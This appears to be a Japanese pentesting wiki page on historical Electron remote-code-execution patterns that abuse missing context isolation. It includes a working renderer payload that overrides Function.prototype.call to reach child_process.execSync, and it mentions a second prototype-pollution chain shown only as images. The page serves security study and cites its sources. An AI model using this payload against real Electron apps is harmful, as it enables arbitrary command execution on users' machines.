# Electronの内部コードを介したcontext isolationのRCE

{{#include ../../banners/hacktricks-training.md}}

これらは、context isolationなしで信頼できないrendererコンテンツを実行していたElectronアプリケーションに対する**過去のexploitパターン**です。context isolationはElectron 12以降、デフォルトで有効になっており、現在も推奨されるセキュリティ設定です。<sup>[[1]](#references)</sup> ElectronとNode.jsのバージョンによって内部実装は異なるため、対象アプリケーションにバンドルされたバージョンで一連の手順を再現してください。

## 例1: `Function.prototype.call`の上書き

この例は、Masato KinugawaによるCureConの発表に基づいています。<sup>[[2]](#references)</sup>

影響を受ける過去のElectronビルドでは、内部のASARコードがプロセスの`exit`リスナーを登録していました。context isolationが無効な場合、ページのコードとElectronの内部コードはJavaScriptのプロトタイプを共有していたため、rendererのコードは内部リスナーが実行される前に`Function.prototype.call`を置き換えることができました。<sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>

```javascript
process.on("exit", function () {
  for (let p in cachedArchives) {
    if (!hasProp.call(cachedArchives, p)) continue
    cachedArchives[p].destroy()
  }
})
```

![contextIsolation RCEの例で使用されたElectronのasar.js内部コードパス](<../../images/image (1070).png>)

リスナーはNode.jsのイベント機構を通じてディスパッチされました。元のページには古い`bin/events.js`パスへのリンクがありましたが、同じ歴史的コミットの現行ソースは`lib/events.js`にあります。<sup>[[5]](#references)</sup>

![Electron contextIsolation RCEチェーンで到達したNode events.jsのコードパス](<../../images/image (793).png>)

このパスでは、`self`はNode.jsのprocessオブジェクトです。

![Electron内部コード経由のElectron contextIsolation RCE - 例1: 「self」がNodeのprocessオブジェクトである箇所](<../../images/image (700).png>)

歴史的なprocessオブジェクトは、`require`へのパスを公開していました。

```
process.mainModule.require
```

listener dispatcher が process object を引数に handler を呼び出していたため、`call` をオーバーライドすればその object を取得し、native command を実行できました。

```html
<script>
  Function.prototype.call = function (process) {
    process.mainModule.require("child_process").execSync("calc")
  }
  location.reload() // Trigger the listener during navigation
</script>
```

## 例2: prototype pollution

ElectroVoltのプレゼンテーションでは、prototype pollutionを通じて`require`オブジェクトを取得する、別の過去の攻撃チェーンが紹介されています。<sup>[[4]](#references)</sup>

Leak:

<figure><img src="../../images/image (279).png" alt=""><figcaption></figcaption></figure>

Exploit:

<figure><img src="../../images/image (89).png" alt=""><figcaption></figcaption></figure>

## References

- [1] [Electronドキュメント - Context isolation](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
- [2] [Electron: Context isolationの欠如を悪用する - CureCon](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=41)
- [3] [Electronの過去のソースコード - lib/common/asar.js](https://github.com/electron/electron/blob/664c184fcb98bb5b4b6b569553e7f7339d3ba4c5/lib/common/asar.js#L30-L36)
- [4] [ElectroVolt: 人気のデスクトップアプリを攻略し、Electronの新たな攻撃対象領域を発見する](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [5] [Node.jsの過去のソースコード - `lib/events.js`のリスナー呼び出し](https://github.com/nodejs/node/blob/8a44289089a08b7b19fa3c4651b5f1f5d1edd71b/lib/events.js#L156-L231)
{{#include ../../banners/hacktricks-training.md}}
